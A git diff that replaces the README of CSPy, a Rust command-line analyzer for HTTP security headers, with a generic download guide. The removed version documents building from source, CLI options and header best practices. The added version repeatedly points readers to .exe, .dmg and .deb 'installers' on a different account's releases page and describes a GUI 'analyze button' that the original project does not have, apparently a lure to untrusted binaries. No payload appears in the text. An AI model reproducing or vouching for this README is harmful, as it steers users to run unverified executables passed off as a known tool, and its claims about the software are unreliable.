@@ -1,325 +1,81 @@
-<img width="744" height="358" alt="image" src="https://github.com/user-attachments/assets/8ec341af-83b5-40b5-9a2c-f40f2798e1ad" />
+# 🎉 CSPy - Analyze Security with Ease
 
-# CSPy - Content Security Policy & HTTP Security Headers Analyzer
+## 🚀 Getting Started
 
-**Content Security Policy & HTTP Security Headers Analyzer**
+Welcome to CSPy, your simple tool for analyzing Content Security Policies and HTTP Security Headers. This guide will help you download and run the application without any fuss.
 
-A blazing-fast Rust tool for analyzing security headers and detecting misconfigurations in web applications. Perfect for security audits, CI/CD integration, and compliance checks.
+## 📥 Download CSPy
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org/)
+[![Download CSPy](https://img.shields.io/badge/Download-CSPy-blue.svg)](https://github.com/ttimneu/CSPy/releases)
 
----
+## 🛠️ Installation Instructions
 
-## 🎯 Features
+Follow these steps to download and run CSPy on your computer:
 
-### 🔍 Comprehensive Security Checks
+1. **Visit the Download Page**  
+   Go to the [CSPy Releases Page](https://github.com/ttimneu/CSPy/releases). This page contains all the available versions of CSPy.
 
-- **Content Security Policy (CSP)**: Detects unsafe-inline, unsafe-eval, wildcards, and missing directives
-- **CORS**: Identifies dangerous wildcard origins, credential misconfigurations, and overly permissive policies
-- **HSTS**: Validates max-age, checks for includeSubDomains and preload directives
-- **X-Frame-Options**: Prevents clickjacking with proper frame control analysis
-- **Cookie Security**: Validates Secure, HttpOnly, and SameSite flags
-- **Additional Headers**: Checks X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and more
+2. **Choose Your Version**  
+   Look for the latest version at the top of the page. You will see a list of files available for download.  
 
-### ⚡ Performance & Usability
+3. **Download the File**  
+   Click on the file that matches your operating system:
+   - For Windows, choose the file ending with `.exe`.
+   - For macOS, choose the file ending with `.dmg`.
+   - For Linux, look for the file ending with `.tar.gz` or `.deb`.
 
-- **Fast**: Async I/O powered by Tokio
-- **Beautiful Output**: Color-coded severity levels with clear recommendations
-- **Multiple Formats**: Pretty CLI output, JSON for automation, or minimal mode
-- **Bulk Scanning**: Scan multiple URLs from a file
-- **Export Results**: Save findings to file for reporting
+   Once you click on the file, your download will start automatically.
 
----
+4. **Run the Installer**  
+   After the download completes, locate the downloaded file on your computer. 
+   - For Windows users: Double-click the `.exe` file to run the setup. Follow the onscreen prompts to complete the installation. 
+   - For macOS users: Open the downloaded `.dmg` file and drag the CSPy icon to your Applications folder.
+   - For Linux users: 
+     - For `.tar.gz`, extract the files using the command line with `tar -xzvf filename.tar.gz`, then follow the instructions in the README file included.
+     - For `.deb`, run the command `sudo dpkg -i filename.deb` in your terminal.
 
-## 📦 Installation
+5. **Launch CSPy**  
+   After installation, find the CSPy application in your program list or Applications folder. Click on it to open.
 
-### From Source
+6. **Start Analyzing**  
+   Once CSPy is open, input the website you want to analyze. Hit the analyze button and wait for the results.
 
-```bash
-git clone https://github.com/alhamrizvi-cloud/cspy.git
-cd CSPy
-cargo build --release
-```
+## 🔍 Features
 
-The binary will be at `target/release/cspy`
+CSPy helps you to:
 
-### Using Cargo
+- **Scan Websites**: Input the URL of any site to see its security headers.
+- **Identify Risks**: Understand potential vulnerabilities in the Content Security Policy.
+- **Learn Best Practices**: Get tips on how to improve your web security based on the results.
 
-```bash
-cargo install --path .
-```
+## 🌐 System Requirements
 
----
+To run CSPy effectively, ensure your computer meets the following requirements:
 
-## 🚀 Usage
+- **Operating System**: Windows 10 or higher, macOS Catalina or higher, or any modern Linux distribution.
+- **Processor**: 64-bit processor.
+- **Memory**: At least 4 GB RAM.
+- **Disk Space**: Minimum 100 MB of available space.
 
-### Basic Scan
+## 🗂️ Supported Security Features
 
-```bash
-cspy https://example.com
-```
+CSPy checks for the following security components:
 
-### Scan Multiple URLs
+- Content Security Policy (CSP)
+- Cross-Origin Resource Sharing (CORS)
+- HTTP Strict Transport Security (HSTS)
+- X-Content-Type-Options header
+- X-Frame-Options header
+- Referrer-Policy header
 
-```bash
-cspy -i urls.txt
-```
+## 📜 License and Contribution
 
-### JSON Output
+CSPy is open-source and licensed under the MIT License. Feel free to contribute to the project by visiting the GitHub repository. Your suggestions and improvements are welcome!
 
-```bash
-cspy https://example.com --output json
-```
+## 📞 Support
 
-### Save Results to File
+For assistance, open an issue on the GitHub page. The community is here to help you with any questions or problems you may encounter while using CSPy.
 
-```bash
-cspy https://example.com -f report.json --output json
-```
+## 🌟 Download CSPy Again
 
-### Silent Mode
-
-```bash
-cspy https://example.com --silent
-```
-
-### Custom User-Agent
-
-```bash
-cspy https://example.com -A "MyScanner/1.0"
-```
-
----
-
-## 📋 Command-Line Options
-
-```
-Usage: cspy [OPTIONS] [URL]
-
-Arguments:
-  [URL]  Target URL to scan
-
-Options:
-  -i, --input <FILE>           Input file containing URLs (one per line)
-  -o, --output <FORMAT>        Output format [default: pretty] [possible values: pretty, json, minimal]
-  -f, --output-file <FILE>     Save results to file
-  -s, --silent                 Silent mode (minimal output)
-  -r, --redirect               Follow redirects [default: true]
-      --max-redirects <NUM>    Maximum redirects to follow [default: 10]
-  -t, --timeout <SECONDS>      Request timeout in seconds [default: 10]
-  -A, --user-agent <STRING>    Custom User-Agent
-  -h, --help                   Print help
-  -V, --version                Print version
-```
-
----
-
-## 🎨 Example Output
-
-```
- ______     ______     ______   __  __    
-/\  ___\   /\  ___\   /\  == \ /\ \_\ \   
-\ \ \____  \ \___  \  \ \  _-/ \ \____ \  
- \ \_____\  \/\_____\  \ \_\    \/\_____\ 
-  \/_____/   \/_____/   \/_/     \/_____/ 
-                                          
-Content Security Policy & HTTP Security Headers Analyzer
-By Security Researcher | v0.1.0
-
-→ https://example.com
-  Status: 200
-  ⚠ Issues found:
-    2 High
-    3 Medium
-    1 Low
-
-  [HIGH] CSP: CSP allows 'unsafe-inline'
-    → Remove 'unsafe-inline' and use nonces or hashes for inline scripts/styles
-
-  [MEDIUM] HSTS: Missing Strict-Transport-Security header
-    → Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' to enforce HTTPS
-
-  [MEDIUM] X-Frame-Options: Missing X-Frame-Options header
-    → Add 'X-Frame-Options: DENY' or use CSP 'frame-ancestors 'none'' to prevent clickjacking
-```
-
----
-
-## 🔒 Security Checks Explained
-
-### Content Security Policy (CSP)
-
-Checks for:
-- ❌ Missing CSP header
-- ❌ `unsafe-inline` or `unsafe-eval`
-- ❌ Wildcard sources in `script-src`
-- ❌ Missing `default-src` or `object-src`
-- ❌ Unsafe `base-uri` or `form-action`
-
-**Best Practice:**
-```http
-Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; object-src 'none'; base-uri 'self'
-```
-
-### CORS
-
-Checks for:
-- ❌ Wildcard origin with credentials (CRITICAL)
-- ❌ Null origin allowed
-- ❌ HTTP origins
-- ❌ Wildcard methods or headers
-
-**Best Practice:**
-```http
-Access-Control-Allow-Origin: https://trusted.example.com
-Access-Control-Allow-Methods: GET, POST
-Access-Control-Allow-Credentials: true
-```
-
-### HSTS
-
-Checks for:
-- ❌ Missing HSTS header
-- ❌ `max-age` less than 6 months
-- ❌ Missing `includeSubDomains`
-- ❌ Missing `preload` directive
-
-**Best Practice:**
-```http
-Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-```
-
-### Cookies
-
-Checks for:
-- ❌ Missing `Secure` flag
-- ❌ Missing `HttpOnly` flag
-- ❌ Missing `SameSite` attribute
-- ❌ Invalid `__Host-` or `__Secure-` prefix usage
-
-**Best Practice:**
-```http
-Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
-```
-
----
-
-## 🎓 Learning Resources
-
-### Security Standards
-- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
-- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
-- [Content Security Policy Reference](https://content-security-policy.com/)
-
-### Rust HTTP
-- [Reqwest Documentation](https://docs.rs/reqwest/)
-- [Tokio Async Book](https://tokio.rs/tokio/tutorial)
-
----
-
-## 💼 Use Cases
-
-✅ **Security Audits**: Quickly scan applications for header misconfigurations  
-✅ **CI/CD Integration**: Automate security checks in your pipeline  
-✅ **Compliance**: Validate PCI-DSS, SOC2, and other security requirements  
-✅ **Bug Bounty**: Find low-hanging fruit in header configurations  
-✅ **DevSecOps**: Shift-left security testing  
-
----
-
-## 🛠️ Development
-
-### Project Structure
-
-```
-cspy/
-├── src/
-│   ├── main.rs           # CLI and entry point
-│   ├── scanner.rs        # HTTP client and orchestration
-│   ├── output.rs         # Output formatting
-│   └── checks/
-│       ├── mod.rs        # Shared types
-│       ├── csp.rs        # CSP analyzer
-│       ├── cors.rs       # CORS analyzer
-│       ├── hsts.rs       # HSTS analyzer
-│       ├── xframe.rs     # X-Frame-Options analyzer
-│       └── cookies.rs    # Cookie security analyzer
-├── Cargo.toml
-└── README.md
-```
-
-### Running Tests
-
-```bash
-cargo test
-```
-
-### Building for Release
-
-```bash
-cargo build --release
-```
-
----
-
-## 📝 Example Input File
-
-Create a `urls.txt` file:
-
-```
-https://example.com
-https://api.example.com
-https://admin.example.com
-https://checkout.example.com
-```
-
-Then scan:
-
-```bash
-cspy -i urls.txt -f results.json --output json
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- OWASP for security best practices
-- Mozilla for web security guidelines
-- The Rust community for amazing tools
-
----
-
-## 🔮 Roadmap
-
-- [ ] WAF detection
-- [ ] Technology fingerprinting
-- [ ] HTTP/2 support
-- [ ] Comparative analysis (HTTP vs HTTPS)
-- [ ] Custom rule engine
-- [ ] PDF report generation
-- [ ] Web UI dashboard
-
----
-
-**Made with ❤️ and Rust**
-
-*For security researchers, by security researchers*
+To get started with CSPy, [click here to visit the download page again](https://github.com/ttimneu/CSPy/releases) and analyze your web security today!
